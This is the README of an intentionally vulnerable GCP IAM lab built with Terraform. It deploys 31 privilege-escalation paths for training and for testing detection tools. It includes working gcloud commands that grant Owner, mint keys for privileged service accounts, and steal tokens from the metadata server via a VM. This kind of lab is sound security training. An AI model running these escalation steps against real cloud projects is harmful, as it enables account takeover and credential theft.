# GCP IAM Vulnerable

Intentionally vulnerable GCP IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **GCP Project**: An isolated test project with no production resources
2. **gcloud CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Owner or IAM Admin role on the project

## Quick Start

```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Set your project
export PROJECT_ID="your-test-project-id"
gcloud config set project $PROJECT_ID

# Enable Service Usage API (required for Terraform to enable other APIs)
gcloud services enable serviceusage.googleapis.com --project $PROJECT_ID

# Configure your project
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars and set gcp_project_id to your project ID

# Deploy
terraform init
terraform apply
```

**APIs enabled automatically by Terraform:**
- `iam.googleapis.com` - IAM API
- `cloudresourcemanager.googleapis.com` - Resource Manager API
- `compute.googleapis.com` - Compute Engine API
- `cloudfunctions.googleapis.com` - Cloud Functions API
- `cloudbuild.googleapis.com` - Cloud Build API
- `run.googleapis.com` - Cloud Run API
- `storage.googleapis.com` - Cloud Storage API
- `secretmanager.googleapis.com` - Secret Manager API

## Configuration

Edit `terraform.tfvars`:

```hcl
# Required: Your GCP project ID
gcp_project_id = "your-test-project-id"

# Optional: Region (default: us-central1)
gcp_region = "us-central1"

# Optional: Attacker identity (defaults to current user)
# attacker_member = "user:attacker@example.com"
```

## What Gets Created

### Free Resources (Default)

**31 Privilege Escalation Paths:**

| # | Name | Vulnerable Permission | Attack Vector |
|---|------|----------------------|---------------|
| 1 | setIamPolicy-project | `resourcemanager.projects.setIamPolicy` | Modify project IAM to grant Owner |
| 2 | createServiceAccountKey | `iam.serviceAccountKeys.create` | Create key for privileged SA |
| 3 | setIamPolicy-serviceAccount | `iam.serviceAccounts.setIamPolicy` | Grant self impersonation rights |
| 4 | actAs-compute | `actAs` + `compute.instances.create` | Create VM with privileged SA |
| 5 | actAs-cloudfunction | `actAs` + `cloudfunctions.functions.create` | Deploy function as privileged SA |
| 6 | actAs-cloudrun | `actAs` + `run.services.create` | Deploy Cloud Run as privileged SA |
| 7 | actAs-cloudbuild | `actAs` + `cloudbuild.builds.create` | Run build as privileged SA |
| 8 | getAccessToken | `iam.serviceAccounts.getAccessToken` | Generate access token directly |
| 9 | signBlob | `iam.serviceAccounts.signBlob` | Sign data for token forgery |
| 10 | signJwt | `iam.serviceAccounts.signJwt` | Sign JWT for token forgery |
| 11 | updateRole | `iam.roles.update` | Add permissions to held role |
| 12 | setMetadata-compute | `compute.instances.setMetadata` | Add SSH key to instances |
| 13 | osLogin | `compute.instances.osAdminLogin` | SSH via OS Login |
| 14 | setIamPolicy-bucket | `storage.buckets.setIamPolicy` | Grant bucket access |
| 15 | updateFunction | `cloudfunctions.functions.update` | Modify function code |
| 16 | explicitDeny-bypass | SA chaining | Bypass deny via impersonation |
| 17 | deploymentManager | `deploymentmanager.deployments.create` | Deploy infra as privileged SA |
| 18 | composer | `composer.environments.create` | Create Airflow as privileged SA |
| 19 | dataflow | `dataflow.jobs.create` | Run Dataflow as privileged SA |
| 20 | secretManager | `secretmanager.versions.access` | Access stored secrets |
| 21 | setIamPolicy-pubsub | `pubsub.topics.setIamPolicy` | Modify Pub/Sub access |
| 22 | cloudScheduler | `cloudscheduler.jobs.create` | Schedule tasks with SA identity |
| 23 | implicitDelegation | `iam.serviceAccounts.implicitDelegation` | Multi-hop impersonation chain |
| 24 | getOpenIdToken | `iam.serviceAccounts.getOpenIdToken` | Generate OIDC tokens for services |
| 25 | setServiceAccount | `compute.instances.setServiceAccount` | Change VM's service account |
| 26 | instanceTemplates | `compute.instanceTemplates.create` | Create templates with priv SA |
| 27 | runJobsCreate | `run.jobs.create` + `actAs` | Create Cloud Run job as priv SA |
| 28 | dataprocClusters | `dataproc.clusters.create` + `actAs` | Create Dataproc as priv SA |
| 29 | gkeCluster | `container.clusters.create` + `actAs` | Create GKE cluster as priv SA |
| 30 | notebooksInstances | `notebooks.instances.create` + `actAs` | Create Vertex AI notebook |
| 31 | workflows | `workflows.workflows.create` + `actAs` | Create workflow as priv SA |

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Non-Free Resources (Optional)

Uncomment in `main.tf` to enable:

| Module | Cost/Hour | Cost/Month | Description |
|--------|-----------|------------|-------------|
| compute | ~$0.002 | ~$2-3 | VM (preemptible) with privileged SA |
| cloud-functions | $0 | Free tier | Function with privileged SA |
| cloud-run | $0 | Free tier | Service with privileged SA |

## Cost Summary

| Configuration | Cost/Hour | Cost/Month |
|---------------|-----------|------------|
| **Default (31 IAM paths only)** | **$0.00** | **$0** |
| + Compute module (preemptible) | +$0.002 | +$2-3 |
| + Compute module (standard) | +$0.008 | +$6-7 |
| + Cloud Functions (idle) | +$0.00 | Free tier |
| + Cloud Run (idle) | +$0.00 | Free tier |
| **All modules enabled** | ~$0.01 | ~$5-10 |

**Note:** The default deployment creates only IAM resources (service accounts, custom roles, IAM bindings) which are **completely free**. Non-free modules must be explicitly enabled.

## Testing with FoxMapper

```bash
# Create a graph of your vulnerable project
foxmapper gcp graph create --project YOUR_PROJECT_ID

# Find privilege escalation paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID

# Find multiple paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID --paths 3

# List all admins
foxmapper gcp argquery --preset admin --project YOUR_PROJECT_ID
```

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test projects
- Projects with no sensitive data
- Projects not connected to production systems

## Exploitation Examples

### Path 1: setIamPolicy on Project

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account privesc1-set-iam-policy@PROJECT.iam.gserviceaccount.com

# Get current IAM policy
gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json

# Add yourself as Owner
# Edit policy.json to add binding

# Set the modified policy
gcloud projects set-iam-policy PROJECT_ID policy.json
```

### Path 2: Create Service Account Key

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account privesc2-create-sa-key@PROJECT.iam.gserviceaccount.com

# Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com

# Use the key
gcloud auth activate-service-account --key-file=key.json
```

### Path 4: actAs + Compute

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account privesc4-actas-compute@PROJECT.iam.gserviceaccount.com

# Create a VM with the high-priv SA
gcloud compute instances create evil-vm \
  --service-account=privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --zone=us-central1-a

# SSH to the VM and use the metadata server
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Architecture

```
gcp/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── outputs.tf                 # Output values
├── terraform.tfvars.example   # Example configuration
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 31 privilege escalation paths
    │   │   ├── common.tf      # Shared resources
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── compute/           # GCE instance
        ├── cloud-functions/   # Cloud Functions
        └── cloud-run/         # Cloud Run service
```

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
